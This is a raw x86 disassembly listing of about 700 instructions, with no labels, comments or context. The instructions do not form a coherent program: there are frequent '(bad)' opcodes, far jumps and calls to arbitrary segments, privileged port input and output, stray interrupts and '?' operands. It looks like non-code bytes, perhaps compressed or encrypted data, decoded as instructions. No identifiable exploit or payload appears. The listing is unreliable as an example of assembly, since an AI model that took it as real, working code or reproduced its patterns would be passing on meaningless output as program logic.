  403ab1:	add    BYTE PTR [ebp+0x79],0xc
  403ab5:	cli    
  403ab6:	push   ds
  403ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab8:	jmp    0xc5567656
  403abd:	shl    ebp,1
  403abf:	lods   al,BYTE PTR ds:[esi]
  403ac0:	xchg   esp,eax
  403ac1:	ds jmp 0x403a6b
  403ac4:	mov    esi,0x4d4e68e0
  403ac9:	jmp    0xff68:0x3a4eb336
  403ad0:	jo     0x403aeb
  403ad2:	stos   BYTE PTR es:[edi],al
  403ad3:	cwde   
  403ad4:	aad    0xc0
  403ad6:	(bad)  
  403ad8:	idiv   BYTE PTR [eax-0xd91efd9]
  403ade:	xchg   esi,eax
  403adf:	jl     0x403b4d
  403ae1:	ja     0x403b4b
  403ae3:	xchg   edx,eax
  403ae4:	inc    ebp
  403ae5:	(bad)  
  403ae6:	fild   QWORD PTR [edi]
  403ae8:	inc    esi
  403ae9:	xchg   BYTE PTR [esp+edi*2],ah
  403aec:	jmp    0x403b5f
  403aee:	dec    ecx
  403aef:	aas    
  403af0:	sub    al,0xa4
  403af2:	mov    dl,0xbf
  403af4:	cmp    esp,ebx
  403af6:	sbb    DWORD PTR [edx],esp
  403af8:	outs   dx,DWORD PTR ds:[esi]
  403af9:	inc    esp
  403afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403afb:	add    DWORD PTR [esi-0x7713413c],esp
  403b01:	and    ebp,DWORD PTR [edi]
  403b03:	dec    ecx
  403b04:	jbe    0x403afc
  403b06:	add    dh,bh
  403b08:	call   0x242da2a8
  403b0d:	jg     0x403a9f
  403b0f:	(bad)  
  403b10:	adc    eax,0x7c56b1f7
  403b15:	aam    0xf8
  403b17:	cdq    
  403b18:	push   ss
  403b19:	xlat   BYTE PTR ds:[ebx]
  403b1a:	adc    bl,BYTE PTR [ebp+0x42]
  403b1d:	(bad)  [ecx+0x13]
  403b20:	mov    ds:0x1e27577,al
  403b25:	mov    DWORD PTR [eax+0x2d],esp
  403b28:	add    dl,ah
  403b2a:	sti    
  403b2b:	and    ch,dh
  403b2d:	inc    ebp
  403b2e:	xor    edx,DWORD PTR [ecx+0x61]
  403b31:	mov    dl,dh
  403b33:	dec    ecx
  403b34:	loopne 0x403ba6
  403b36:	sub    bl,ah
  403b38:	cmp    eax,0xd962d708
  403b3d:	outs   dx,DWORD PTR ds:[esi]
  403b3e:	push   ss
  403b3f:	pushf  
  403b40:	pop    DWORD PTR ds:0x4f85261c
  403b46:	idiv   DWORD PTR [eax+0x1c]
  403b49:	jbe    0x403bba
  403b4b:	inc    esi
  403b4c:	mov    ch,0x76
  403b4e:	test   DWORD PTR [edx-0x32a53771],edx
  403b54:	adc    al,0x9e
  403b56:	out    0x35,al
  403b58:	fcmovu st,st(5)
  403b5a:	loope  0x403b08
  403b5c:	mov    edx,DWORD PTR [edx]
  403b5e:	inc    ebx
  403b5f:	loope  0x403ba9
  403b61:	or     al,bh
  403b63:	repz push ds
  403b65:	out    0x24,eax
  403b67:	mov    bl,0xbe
  403b69:	mov    bl,0xe1
  403b6b:	test   eax,0xbed2a121
  403b70:	jb     0x403b63
  403b72:	stc    
  403b73:	scas   eax,DWORD PTR es:[edi]
  403b74:	xor    DWORD PTR ds:0xc4838d0c,esp
  403b7a:	mov    ch,0x26
  403b7c:	pop    ebp
  403b7d:	push   0xfd4a6321
  403b82:	push   ecx
  403b83:	push   0xc388edd1
  403b88:	outs   dx,DWORD PTR ds:[esi]
  403b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b8a:	sub    al,0x31
  403b8c:	mov    WORD PTR [eax],cs
  403b8e:	loopne 0x403bf6
  403b90:	or     al,BYTE PTR [esi-0x4485a5ee]
  403b96:	or     eax,0xc01e33ba
  403b9b:	leave  
  403b9c:	xlat   BYTE PTR ds:[ebx]
  403b9d:	push   0x49
  403b9f:	out    0xc1,eax
  403ba1:	scas   al,BYTE PTR es:[edi]
  403ba2:	fcmovb st,st(2)
  403ba4:	test   DWORD PTR [ecx-0x5116dc69],ebp
  403baa:	and    DWORD PTR [esi+0x6e],esi
  403bad:	xor    al,BYTE PTR [edx+0x61]
  403bb0:	ins    DWORD PTR es:[edi],dx
  403bb1:	lock adc al,0xec
  403bb4:	mov    ch,0xb4
  403bb6:	mov    ah,0x81
  403bb8:	push   0x71d53bf4
  403bbd:	iret   
  403bbe:	ret    
  403bbf:	cmp    BYTE PTR [esi+0x4c],ch
  403bc2:	cmp    BYTE PTR [edi],dh
  403bc4:	and    edx,edx
  403bc6:	mov    ebx,DWORD PTR [edi]
  403bc8:	sub    eax,0x33b9d1ae
  403bcd:	aas    
  403bce:	sub    al,0xb6
  403bd0:	pop    edx
  403bd1:	pop    esi
  403bd2:	add    edi,esp
  403bd4:	cmp    eax,0xe8ba591a
  403bd9:	stos   BYTE PTR es:[edi],al
  403bda:	into   
  403bdb:	or     al,cl
  403bdd:	push   ecx
  403bde:	jecxz  0x403c5d
  403be0:	ror    edx,0xe9
  403be3:	jmp    0x3183:0x9cbcd223
  403bea:	cmp    BYTE PTR [ebx-0x4cfdea0b],ah
  403bf0:	nop
  403bf1:	xor    esi,esp
  403bf3:	mov    bh,0x34
  403bf5:	std    
  403bf6:	push   esi
  403bf7:	fcmove st,st(3)
  403bf9:	xchg   esi,eax
  403bfa:	mov    dl,0xbd
  403bfc:	xor    ch,BYTE PTR [ebp-0x67]
  403bff:	inc    esp
  403c00:	out    0x6d,al
  403c02:	mov    ah,BYTE PTR [esi+0x24]
  403c05:	jno    0x403c50
  403c07:	fcomp  QWORD PTR [ecx+0x17]
  403c0a:	push   ds
  403c0b:	jne    0x403c63
  403c0d:	xchg   esi,eax
  403c0e:	xor    bh,BYTE PTR [ebp+0x6325a5c4]
  403c14:	mov    ecx,0x8716b406
  403c19:	mov    cl,0xf8
  403c1b:	ret    
  403c1c:	mov    edi,0x641a567d
  403c21:	clc    
  403c22:	aam    0x5d
  403c24:	fidiv  DWORD PTR [esi-0x73]
  403c27:	ins    DWORD PTR es:[edi],dx
  403c28:	das    
  403c29:	jg     0x403c58
  403c2b:	pop    edi
  403c2c:	jmp    0x8bf5f7de
  403c31:	and    esi,DWORD PTR [ebx+0x77]
  403c34:	repnz scas eax,DWORD PTR es:[edi]
  403c36:	cld    
  403c37:	rol    BYTE PTR [ebp+edi*1+0x46],0xec
  403c3c:	mov    bh,0xd4
  403c3e:	inc    edx
  403c3f:	mov    esi,0x5867a32
  403c44:	push   ebx
  403c45:	rcl    BYTE PTR [ebx],1
  403c47:	(bad)
  403c4a:	mov    ds:0x74121e2f,eax
  403c4f:	pop    ecx
  403c50:	mov    WORD PTR [ebx+0x1851b2fd],?
  403c56:	js     0x403c80
  403c58:	sub    cl,dh
  403c5a:	mov    cl,0x2c
  403c5c:	popa   
  403c5d:	nop
  403c5e:	pop    esp
  403c5f:	pop    ebp
  403c60:	push   es
  403c61:	pop    ebx
  403c62:	rcl    DWORD PTR [ecx],cl
  403c64:	ins    BYTE PTR es:[edi],dx
  403c65:	push   0xffffffc5
  403c67:	pop    ebp
  403c68:	(bad)  
  403c69:	ror    BYTE PTR [ebp-0x3f],1
  403c6c:	or     BYTE PTR [ebp-0x5d],cl
  403c6f:	lahf   
  403c70:	push   edx
  403c71:	add    al,0xf5
  403c73:	int3   
  403c74:	es push ebx
  403c76:	xor    ah,dh
  403c78:	ret    0x7f4d
  403c7b:	(bad)
  403c7f:	pop    esi
  403c80:	pop    ebx
  403c81:	pop    esi
  403c82:	rcr    DWORD PTR [ecx],1
  403c84:	sbb    bh,BYTE PTR [ebx+0x2f904ee9]
  403c8a:	(bad)  
  403c8c:	fisttp QWORD PTR [eax]
  403c8e:	sbb    DWORD PTR [esi],ecx
  403c90:	bound  ebp,QWORD PTR [ebx+0x65]
  403c93:	jl     0x403c1a
  403c95:	cld    
  403c96:	mov    ebx,DWORD PTR [ecx]
  403c98:	jnp    0x403cde
  403c9a:	retf   0x9fe9
  403c9d:	daa    
  403c9e:	ret    
  403c9f:	call   0xf268:0x5c850c31
  403ca6:	xor    ah,BYTE PTR [ecx+0x2bc4bbb4]
  403cac:	(bad)  
  403cad:	fwait
  403cae:	cdq    
  403caf:	cdq    
  403cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cb1:	jo     0x403ced
  403cb3:	adc    BYTE PTR [ecx+0x54],0xa
  403cb7:	jns    0x403c56
  403cb9:	mov    BYTE PTR [ebx+0x11],bh
  403cbc:	lahf   
  403cbd:	mov    WORD PTR [edx],?
  403cbf:	push   eax
  403cc0:	cwde   
  403cc1:	in     al,0x6c
  403cc3:	push   cs
  403cc4:	lods   eax,DWORD PTR ds:[esi]
  403cc5:	xor    ah,BYTE PTR [edi+0x3358a58b]
  403ccb:	mov    bh,0xfb
  403ccd:	xor    dh,dl
  403ccf:	hlt    
  403cd0:	push   eax
  403cd1:	or     edi,DWORD PTR [esi+0x22]
  403cd4:	pop    es
  403cd5:	cmp    eax,0x235db1de
  403cda:	in     al,dx
  403cdb:	imul   eax,DWORD PTR [esi+eax*8+0x327ef714],0xffffff8f
  403ce3:	mov    ch,0xb6
  403ce5:	sbb    dh,BYTE PTR [ebx+0x32]
  403ce8:	mov    esi,DWORD PTR [ecx]
  403cea:	cdq    
  403ceb:	inc    esi
  403cec:	dec    ecx
  403ced:	pusha  
  403cee:	cmp    BYTE PTR [edi+edi*2+0x72812c93],dh
  403cf5:	pop    ds
  403cf6:	cmp    bl,BYTE PTR [eax+0x44]
  403cf9:	stc    
  403cfa:	sub    eax,0x5ad581ba
  403cff:	call   0x10755fd8
  403d04:	hlt    
  403d05:	sbb    al,0x28
  403d07:	mov    ah,0x4f
  403d09:	push   edx
  403d0a:	ins    BYTE PTR es:[edi],dx
  403d0b:	push   edi
  403d0c:	jmp    0x8d3a:0xdde1890f
  403d13:	stc    
  403d14:	push   0x74
  403d16:	int    0x20
  403d18:	mov    ch,0xde
  403d1a:	sbb    al,0x6a
  403d1c:	call   0xb1ae6312
  403d21:	(bad)
  403d26:	fs pop esi
  403d28:	rcr    BYTE PTR [eax+0x4e92f6db],1
  403d2e:	mov    esp,0x125def12
  403d33:	xor    bl,al
  403d35:	dec    edi
  403d36:	pop    ecx
  403d37:	jo     0x403cbb
  403d39:	adc    al,0xd5
  403d3b:	pop    edi
  403d3c:	jne    0x403d7d
  403d3e:	xchg   ecx,eax
  403d3f:	mov    ds:0x6a9e05bb,al
  403d44:	dec    ecx
  403d45:	cmp    cl,BYTE PTR [edi-0x50]
  403d48:	add    esi,ebx
  403d4a:	pop    DWORD PTR [ebp-0x29d630a5]
  403d50:	or     ebp,esi
  403d52:	mov    ds:0x5bf8a740,eax
  403d57:	mov    esp,0x21345799
  403d5c:	xchg   ecx,eax
  403d5d:	adc    ebx,DWORD PTR [edi+0x7e]
  403d60:	mov    dl,0x25
  403d62:	push   DWORD PTR [ebp-0x52]
  403d65:	lods   eax,DWORD PTR ds:[esi]
  403d66:	xchg   DWORD PTR [edx-0x712890b],esi
  403d6c:	retf   0x6ef7
  403d6f:	(bad)  
  403d70:	(bad)  
  403d72:	jp     0x403dc1
  403d74:	je     0x403de2
  403d76:	inc    edx
  403d77:	inc    esi
  403d78:	push   ebp
  403d79:	sbb    ch,BYTE PTR [eax-0x7cbd0a78]
  403d7f:	mov    ebp,0xb2c186f
  403d84:	rcl    DWORD PTR [edx],1
  403d86:	gs clc 
  403d88:	lock pop esp
  403d8a:	mov    ch,0xb6
  403d8c:	xor    eax,0xc971b51a
  403d91:	pop    edx
  403d92:	push   edx
  403d93:	dec    ebx
  403d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d95:	cmp    BYTE PTR [ebp+0x41],ah
  403d98:	idiv   cl
  403d9a:	(bad)  
  403d9c:	push   eax
  403d9d:	mov    bl,0xa
  403d9f:	shl    BYTE PTR [esp-0x7],1
  403da3:	ficomp DWORD PTR [esi]
  403da5:	adc    eax,0x55b6fb9a
  403daa:	fsub   QWORD PTR [edx]
  403dac:	mov    ecx,0x4ead7cf9
  403db1:	lods   eax,DWORD PTR ds:[esi]
  403db2:	icebp  
  403db3:	xchg   esi,eax
  403db4:	dec    esp
  403db5:	jae    0x403deb
  403db7:	pop    edx
  403db8:	ss js  0x403d98
  403dbb:	mov    dh,0xf
  403dbd:	(bad)  
  403dbe:	or     edx,DWORD PTR [edx-0x3]
  403dc1:	das    
  403dc2:	aad    0x9d
  403dc4:	fwait
  403dc5:	jge    0x403d5d
  403dc7:	jae    0x403d68
  403dc9:	mov    eax,ds:0xe7e9f1f6
  403dce:	pop    ss
  403dcf:	pop    es
  403dd0:	mov    dl,0x41
  403dd2:	out    0xd3,eax
  403dd4:	and    bh,dh
  403dd6:	dec    ebp
  403dd7:	or     edx,DWORD PTR [ecx+edi*4]
  403dda:	das    
  403ddb:	sub    al,0x82
  403ddd:	dec    esi
  403dde:	loope  0x403db3
  403de0:	test   al,0x4a
  403de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403de3:	addr16 test al,0xc4
  403de6:	xchg   ecx,eax
  403de7:	lods   al,BYTE PTR ds:[esi]
  403de8:	sub    ebp,ebp
  403dea:	cmc    
  403deb:	cmp    edi,eax
  403ded:	es sub eax,0x3e4caf5f
  403df3:	out    dx,al
  403df4:	add    dh,BYTE PTR [eax]
  403df6:	js     0x403dd5
  403df8:	pusha  
  403df9:	lahf   
  403dfa:	pop    ss
  403dfb:	dec    ebx
  403dfc:	iret   
  403dfd:	sbb    eax,0x46e9d289
  403e02:	aam    0x65
  403e04:	sbb    eax,0x4b404e6d
  403e09:	clc    
  403e0a:	mov    esi,0xa31f7347
  403e0f:	or     eax,0xc0c67de0
  403e14:	jo     0x403da7
  403e16:	adc    al,0xff
  403e18:	sub    al,BYTE PTR [ecx-0x4ee8bc76]
  403e1e:	xchg   esp,eax
  403e1f:	cmp    al,bl
  403e21:	ret    
  403e22:	push   edi
  403e23:	mov    ah,0xf
  403e25:	mov    ecx,0x20f0c346
  403e2a:	adc    ebx,DWORD PTR [ebp-0xd]
  403e2d:	xor    eax,0x1acf5a46
  403e32:	jmp    DWORD PTR [ecx-0x13fde741]
  403e38:	xor    ebx,edx
  403e3a:	jns    0x403eb7
  403e3c:	(bad)  
  403e3e:	clc    
  403e3f:	mov    BYTE PTR [ebp-0x20de7b84],0x2e
  403e46:	pop    es
  403e47:	and    eax,0x466a6156
  403e4c:	push   cs
  403e4d:	xor    eax,0xc3e3292f
  403e52:	cld    
  403e53:	push   ss
  403e54:	(bad)  
  403e55:	cmp    al,0x3f
  403e57:	std    
  403e58:	push   ecx
  403e59:	scas   eax,DWORD PTR es:[edi]
  403e5a:	and    DWORD PTR [ecx+0x28],0xc91e4a3
  403e61:	fcomp  DWORD PTR [ecx]
  403e63:	xchg   BYTE PTR [edi-0x36],cl
  403e66:	aam    0x85
  403e68:	push   edx
  403e69:	cmp    al,0x93
  403e6b:	popf   
  403e6c:	or     DWORD PTR [eax],esi
  403e6e:	mov    bh,0x49
  403e70:	jo     0x403eae
  403e72:	out    dx,al
  403e73:	not    eax
  403e75:	xor    DWORD PTR [esi+0x4],ecx
  403e78:	sub    eax,0xed47b286
  403e7d:	xchg   ebp,ebx
  403e7f:	(bad)  
  403e80:	test   eax,eax
  403e82:	ror    BYTE PTR [ecx-0xbd98469],cl
  403e88:	push   cs
  403e89:	pop    esi
  403e8a:	ds push 0x98de9cc7
  403e90:	mov    BYTE PTR [edx],bh
  403e92:	xor    BYTE PTR [ebx+0x785121da],dh
  403e98:	adc    BYTE PTR [ecx-0x7b19e806],ch
  403e9e:	push   ds
  403e9f:	aad    0xca
  403ea1:	not    DWORD PTR [eax]
  403ea3:	and    eax,edi
  403ea5:	fld    QWORD PTR [ecx+0x27]
  403ea8:	pop    ebp
  403ea9:	ret    
  403eaa:	call   DWORD PTR [edi-0x6d]
  403ead:	and    al,0xdf
  403eaf:	lahf   
  403eb0:	push   ss
  403eb1:	dec    ebx
  403eb2:	inc    ecx
  403eb3:	cmp    al,0xdd
  403eb5:	scas   al,BYTE PTR es:[edi]
  403eb6:	jo     0x403ecc
  403eb8:	push   cs
  403eb9:	xchg   ebx,eax
  403eba:	fild   QWORD PTR [ebx+0x1d]
  403ebd:	pop    ebp
  403ebe:	dec    edx
  403ebf:	mov    BYTE PTR [ebp-0x901f18d],0x58
  403ec6:	add    BYTE PTR [eax+0x4c],0x9e
  403eca:	int    0x44
  403ecc:	sub    al,0x1f
  403ece:	xor    bh,BYTE PTR [eax-0x28]
  403ed1:	pop    edi
  403ed2:	push   ebx
  403ed3:	push   ss
  403ed4:	inc    esi
  403ed5:	and    esp,DWORD PTR [ecx-0x59dddfa5]
  403edb:	or     ecx,DWORD PTR [ecx-0x2e]
  403ede:	add    eax,0x3ad6a757
  403ee3:	xor    DWORD PTR [ebx-0x70],ebp
  403ee6:	add    al,0x1e
  403ee8:	scas   al,BYTE PTR es:[edi]
  403ee9:	cmp    al,0x20
  403eeb:	sub    dl,dh
  403eed:	in     eax,0xd7
  403eef:	fstp   TBYTE PTR ds:0xb9350ea6
  403ef5:	sub    cl,BYTE PTR [edi+eiz*2-0x2c13ae98]
  403efc:	ret    0xf7fd
  403eff:	cwde   
  403f00:	out    0x49,eax
  403f02:	fisttp QWORD PTR [edi]
  403f04:	iret   
  403f05:	imul   esi,DWORD PTR [edi],0x8ca7f23b
  403f0b:	push   esp
  403f0c:	adc    DWORD PTR [eax+0xc5635dd],esp
  403f12:	adc    dh,0x5b
  403f15:	sub    cl,dl
  403f17:	dec    edx
  403f18:	dec    ecx
  403f19:	gs mov cl,bh
  403f1c:	int3   
  403f1d:	or     esi,DWORD PTR [eax-0x46]
  403f20:	jo     0x403f5c
  403f22:	inc    ecx
  403f23:	(bad)  
  403f24:	scas   eax,DWORD PTR es:[edi]
  403f25:	mov    bh,0x96
  403f27:	out    dx,al
  403f28:	data16 repnz xor al,0x9a
  403f2c:	fmul   DWORD PTR ds:0xedd9a718
  403f32:	outs   dx,BYTE PTR ds:[esi]
  403f33:	push   esi
  403f34:	mov    al,ds:0xb97d653d
  403f39:	jnp    0x403f61
  403f3b:	xchg   ebp,eax
  403f3c:	iret   
  403f3d:	sti    
  403f3e:	dec    esi
  403f3f:	les    ebp,FWORD PTR [edx]
  403f41:	cmp    ch,bh
  403f43:	cdq    
  403f44:	and    ebp,ecx
  403f46:	(bad)  
  403f47:	xor    bh,ch
  403f49:	jns    0x403fc0
  403f4b:	or     al,0x47
  403f4d:	cmp    eax,0x224dcb2
  403f52:	js     0x403efa
  403f54:	and    DWORD PTR [edx],0xc3b443b9
  403f5a:	pushf  
  403f5b:	in     eax,dx
  403f5c:	std    
  403f5d:	jbe    0x403ef2
  403f5f:	or     bh,BYTE PTR [eax+0x29]
  403f62:	les    ebx,FWORD PTR [edx-0x63]
  403f65:	cdq    
  403f66:	dec    edx
  403f67:	mov    WORD PTR [eax+0x56ba5652],ss
  403f6d:	xor    eax,0x95f8dfe8
  403f72:	jb     0x403f0d
  403f74:	pop    ss
  403f75:	wbinvd 
  403f77:	in     al,dx
  403f78:	dec    esp
  403f79:	pop    eax
  403f7a:	xchg   edx,eax
  403f7b:	fdivp  st(3),st
  403f7d:	jb     0x403f4e
  403f7f:	add    ebx,DWORD PTR [ecx-0x6c]
  403f82:	add    al,0x3e
  403f84:	push   ebp
  403f85:	mov    esp,DWORD PTR [edi+esi*4]
  403f88:	inc    ebx
  403f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f8a:	xor    DWORD PTR [ecx-0x4d36a35],0xd9680776
  403f94:	pop    ss
  403f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f96:	fisubr WORD PTR [edi]
  403f98:	les    di,DWORD PTR [ebx-0x3087328f]
  403f9f:	push   esi
  403fa0:	test   ah,dh
  403fa2:	push   ss
  403fa3:	cmp    eax,0x371066e2
  403fa8:	ds or  eax,0xbadc60fe
  403fae:	mov    dh,0x3d
  403fb0:	shl    BYTE PTR [esi+0x17ce6744],cl
  403fb6:	outs   dx,DWORD PTR ds:[esi]
  403fb7:	cmp    edi,DWORD PTR ds:0xa36eaed5
  403fbd:	sar    DWORD PTR [esi-0x53],cl
  403fc0:	add    ch,bh
  403fc2:	dec    edi
  403fc3:	inc    esp
  403fc4:	arpl   bx,ax
  403fc6:	imul   esi,DWORD PTR [ebp+0x1513642c],0x2e
  403fcd:	mov    esp,ebx
  403fcf:	out    0x89,eax
  403fd1:	pop    ss
  403fd2:	dec    edx
  403fd3:	inc    edi
  403fd4:	cwde   
  403fd5:	xor    BYTE PTR [ebx-0x6055f060],dh
  403fdb:	imul   eax,DWORD PTR [esp+ecx*4],0x5c
  403fdf:	addr16 cmp al,0x21
  403fe2:	cli    
  403fe3:	sti    
  403fe4:	inc    edi
  403fe5:	fld    QWORD PTR [ecx+0x12]
  403fe8:	or     BYTE PTR [ebx+ecx*4-0x372a5f1c],dl
  403fef:	or     cl,bl
  403ff1:	add    cl,dl
  403ff3:	fs fs mov edi,0x9e478165
  403ffa:	stc    
  403ffb:	sub    BYTE PTR [edx-0x26],bl
  403ffe:	ror    BYTE PTR [ebp-0x53c1bec3],1
  404004:	jne    0x403f9e
  404006:	push   0x25f4fd37
  40400b:	jne    0x403fdc
  40400d:	push   ecx
  40400e:	or     bl,BYTE PTR [ebx]
  404010:	ss dec eax
  404012:	push   edi
  404013:	jecxz  0x40400a
  404015:	xchg   esi,eax
  404016:	outs   dx,BYTE PTR ds:[esi]
  404017:	xlat   BYTE PTR ds:[ebx]
  404018:	out    dx,eax
  404019:	sahf   
  40401a:	and    al,0x6f
  40401c:	call   FWORD PTR [ebp+ecx*8+0x1cebe98c]
  404023:	cmp    bl,dh
  404025:	add    esp,0xffffffff
  404028:	inc    edi
  404029:	fdivr  DWORD PTR [ecx]
  40402b:	outs   dx,DWORD PTR ds:[esi]
  40402c:	and    DWORD PTR [eax-0x2ca30d38],eax
  404032:	in     eax,0x34
  404034:	mov    ah,0x7d
  404036:	fld    DWORD PTR [ecx+0x5d]
  404039:	test   DWORD PTR [ebx-0x3d],eax
  40403c:	rol    BYTE PTR [ebp+edx*4-0x75],cl
  404040:	mov    cs,WORD PTR [eax]
  404042:	pop    es
  404043:	or     al,0x10
  404045:	jo     0x4040af
  404047:	pop    esi
  404048:	ins    BYTE PTR es:[edi],dx
  404049:	retf   0x1d15
  40404c:	xchg   DWORD PTR [ebx],esp
  40404e:	push   0x2d8cd8da
  404053:	jno    0x404024
  404055:	add    eax,0xb42c5036
  40405a:	call   0xad0f534d
  40405f:	push   ecx
  404060:	sar    BYTE PTR [ecx-0x409fc13d],0xdc
  404067:	dec    ecx
  404068:	outs   dx,DWORD PTR ds:[esi]
  404069:	lds    eax,FWORD PTR [esi+0x34]
  40406c:	jns    0x40402b
  40406e:	(bad)  
  40406f:	mov    ?,WORD PTR [edx+0x5c18d2e3]
  404075:	inc    edi
  404076:	clc    
  404077:	xchg   ebp,eax
  404078:	iret   
  404079:	into   
  40407a:	jecxz  0x404077
  40407c:	pop    esp
  40407d:	inc    ebx
  40407e:	jns    0x404081
  404080:	adc    eax,0x143bd4a
  404085:	loopne 0x404050
  404087:	mov    bl,0x36
  404089:	push   edi
  40408a:	test   ebp,edi
  40408c:	fnstenv [ecx]
  40408e:	add    BYTE PTR [ebx+0x25],al
  404091:	push   edx
  404092:	jns    0x404045
  404094:	pop    ebx
  404095:	pop    esi
  404096:	push   0x34
  404098:	jbe    0x4040c0
  40409a:	sub    DWORD PTR [ebx+0x22fc218b],esp
  4040a0:	jmp    0xf76b:0x955468ba
  4040a7:	push   esp
  4040a8:	mov    eax,ds:0x951caece
  4040ad:	data16 and cl,BYTE PTR [eax+0x73049fd5]
  4040b4:	stos   BYTE PTR es:[edi],al
  4040b5:	cmc    
  4040b6:	mov    ebp,0xc76ab7ac
  4040bb:	inc    eax
  4040bc:	sbb    eax,0xb2e0afea
  4040c1:	push   esp
  4040c2:	jno    0x4040c6
  4040c4:	int3   
  4040c5:	mov    ds:0x6ea4c7fa,eax
  4040ca:	mov    ecx,0x1b272f9a
  4040cf:	inc    edx
  4040d0:	mov    ds:0x6c2c262,eax
  4040d5:	or     ah,bl
  4040d7:	inc    edi
  4040d8:	or     ecx,DWORD PTR [esi]
  4040da:	mov    DWORD PTR [ecx],esi
  4040dc:	test   DWORD PTR [ebp+0x68],ebx
  4040df:	repnz sbb BYTE PTR [esi+esi*2-0x3c],dh
  4040e4:	fwait
  4040e5:	pop    ss
  4040e6:	inc    ebp
  4040e7:	ret    
  4040e8:	(bad)  
  4040e9:	cmp    esp,DWORD PTR [edi+0x6a]
  4040ec:	mov    al,0x10
  4040ee:	loop   0x404144
  4040f0:	loopne 0x404099
  4040f2:	and    al,0xe3
  4040f4:	pop    esi
  4040f5:	jmp    0x35e:0xbba13f82
  4040fc:	aad    0xf5
  4040fe:	adc    DWORD PTR ds:[ebp+esi*8+0x6d],ebx
  404103:	aam    0x8b
  404105:	stos   BYTE PTR es:[edi],al
  404106:	or     eax,0x66f4653f
  40410b:	add    eax,0x9ec432fa
  404110:	push   ss
  404111:	scas   eax,DWORD PTR es:[edi]
  404112:	fsubr  st(2),st
  404114:	xchg   ebx,eax
  404115:	dec    eax
  404116:	rcl    DWORD PTR ds:0x8d690fb3,0x6
  40411d:	push   edi
  40411e:	mov    DWORD PTR [ebx],ebx
  404120:	sbb    eax,0x4124d2b9
  404125:	ds mov dh,0xbc
  404128:	or     al,0x40
  40412a:	or     BYTE PTR [edx-0x7807ef64],ah
  404130:	jno    0x404166
  404132:	xor    cl,BYTE PTR [edx+0x40eeb50c]
  404138:	ins    BYTE PTR es:[edi],dx
  404139:	lock nop
  40413b:	inc    ecx
  40413c:	xchg   esp,eax
  40413d:	rcr    DWORD PTR [ecx],0x9f
  404140:	add    dh,BYTE PTR [edi+0x25]
  404143:	push   esi
  404144:	ins    DWORD PTR es:[edi],dx
  404145:	cdq    
  404146:	(bad)  
  404147:	mov    ebx,0xd4681f9f
  40414c:	xor    edx,edx
  40414e:	and    bh,BYTE PTR [eax+eax*1]
  404151:	jmp    0x78a:0xa8510cf4
  404158:	pop    esp
  404159:	aas    
  40415a:	xor    al,0x3b
  40415c:	or     eax,0x12bb6e8b
  404161:	test   eax,0xa35b7f22
  404166:	in     eax,0x7a
  404168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404169:	repz inc ecx
  40416b:	(bad)  
  40416c:	out    0x9c,eax
  40416e:	add    al,0x81
  404170:	(bad)  
  404171:	fcomi  st,st(2)
  404173:	bound  ebp,QWORD PTR [edx-0x72f6ec77]
  404179:	fistp  QWORD PTR [ebx+0x50d7beb2]
  40417f:	xchg   DWORD PTR [ecx-0x2d6692d6],esi
  404185:	mov    bh,0xa
  404187:	and    eax,0xcdc911d0
  40418c:	inc    BYTE PTR [esi+ebx*1+0x41]
  404190:	ret    0x8c9a
  404193:	add    al,0x8
  404195:	jle    0x404170
  404197:	dec    esi
  404198:	inc    eax
  404199:	pop    ebp
  40419a:	inc    eax
  40419b:	cmp    ebp,edx
  40419d:	aad    0xd2
  40419f:	call   0x4fac:0x1ee4d63f
  4041a6:	mov    ds:0x29154c3b,eax
  4041ab:	(bad)  
  4041ac:	mov    esi,0x2bc1978f
  4041b1:	dec    edi
  4041b2:	jns    0x404170
  4041b4:	mov    esi,eax
  4041b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041b7:	data16 jl 0x404205
  4041ba:	fcmovbe st,st(7)
  4041bc:	or     al,0x6a
  4041be:	mov    ah,ah
  4041c0:	aam    0xc6
  4041c2:	cvttps2pi mm6,QWORD PTR [esi+0x64cf3022]
  4041c9:	pop    ebp
  4041ca:	jmp    0x33661bf
  4041cf:	xor    al,0x55
  4041d1:	pusha  
  4041d2:	jmp    0x4041dd
  4041d4:	lds    esi,FWORD PTR [ebp+eiz*1-0x60679e1e]
  4041db:	dec    ebx
  4041dc:	loopne 0x4041ec
  4041de:	xor    bh,BYTE PTR [edi+0x76]
  4041e1:	ja     0x404250
  4041e3:	and    al,0x48
  4041e5:	sub    edx,edi
  4041e7:	hlt    
  4041e8:	imul   esp,DWORD PTR [ecx-0x76567174],0xffffffd4
  4041ef:	outs   dx,BYTE PTR ds:[esi]
  4041f0:	cld    
  4041f1:	adc    BYTE PTR [edx],bl
  4041f3:	ficomp WORD PTR [esi]
  4041f5:	sub    BYTE PTR ds:0x42a0dbc3,bl
  4041fb:	mov    WORD PTR [edx],?
  4041fd:	add    al,0xde
  4041ff:	(bad)  
  404200:	mov    cl,0x78
  404202:	sbb    eax,0x33190228
  404207:	push   esi
  404208:	inc    ebx
  404209:	pusha  
  40420a:	sbb    esi,DWORD PTR [eax+0x61]
  40420d:	rcr    BYTE PTR [ebp-0x75],1
  404210:	loope  0x4041fa
  404212:	push   ds
  404213:	push   0x2f
  404215:	mov    WORD PTR [edi-0x5643a2b],cs
  40421b:	push   eax
  40421c:	cmp    al,0x67
  40421e:	in     eax,0x12
  404220:	sbb    BYTE PTR [esi-0x7a],dl
  404223:	jne    0x404257
  404225:	jp     0x40424f
  404227:	ja     0x4041d3
  404229:	xor    al,0xb3
  40422b:	das    
  40422c:	adc    eax,eax
  40422e:	cwde   
  40422f:	(bad)  
  404230:	dec    esp
  404231:	jp     0x404262
  404233:	in     al,0xc7
  404235:	mov    bl,0xba
  404237:	dec    ebx
  404238:	or     eax,0x2c5b42ca
  40423d:	mul    DWORD PTR [esi+0x14]
  404240:	repz data16 (bad) 
  404243:	loope  0x404269
  404245:	fs call 0x828:0x7d5d7a6b
